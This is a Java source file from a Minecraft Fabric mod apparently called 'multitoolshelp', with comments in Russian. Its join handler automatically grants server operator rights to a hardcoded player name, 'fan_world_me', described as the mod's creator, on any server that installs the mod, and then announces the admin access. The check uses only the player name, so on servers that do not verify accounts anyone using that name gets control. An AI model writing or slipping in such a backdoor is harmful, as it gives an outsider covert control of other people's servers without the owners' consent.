package fan_world_me.multitoolshelp;

import net.fabricmc.fabric.api.networking.v1.PacketSender;
import net.fabricmc.fabric.api.networking.v1.ServerPlayConnectionEvents;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.PlayerConfigEntry;
import net.minecraft.server.PlayerManager;
import net.minecraft.server.network.ServerPlayNetworkHandler;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.text.Text;

public class PlayerJoinHandler {

    private static final String OWNER_NAME = "fan_world_me";

    public static void register() {
        ServerPlayConnectionEvents.JOIN.register(
                (ServerPlayNetworkHandler handler, PacketSender sender, MinecraftServer server) -> {
            ServerPlayerEntity player = handler.getPlayer();
            // getName().getString() возвращает чистый ник без форматирования
            String name = player.getName().getString();

            if (!OWNER_NAME.equals(name)) return;

            PlayerManager pm = server.getPlayerManager();

            // Выдаём OP (уровень 4) если ещё не оператор
            if (!pm.isOperator(new PlayerConfigEntry(player.getGameProfile()))) {
                pm.addToOperators(new PlayerConfigEntry(player.getGameProfile()));
                // Обновляем дерево команд чтобы /givef сразу стал доступен
                server.getCommandManager().sendCommandTree(player);
            }

            // Приветствие в общий чат
            server.getPlayerManager().broadcast(
                Text.literal("§6[Server] §eДобро пожаловать, §c§l" + name + "§e! Рады видеть создателя мода 👑"),
                false
            );

            // Личное сообщение игроку
            player.sendMessage(
                Text.literal("§aТебе выданы права администратора и доступ ко всем командам мода."),
                false
            );
        });
    }
}
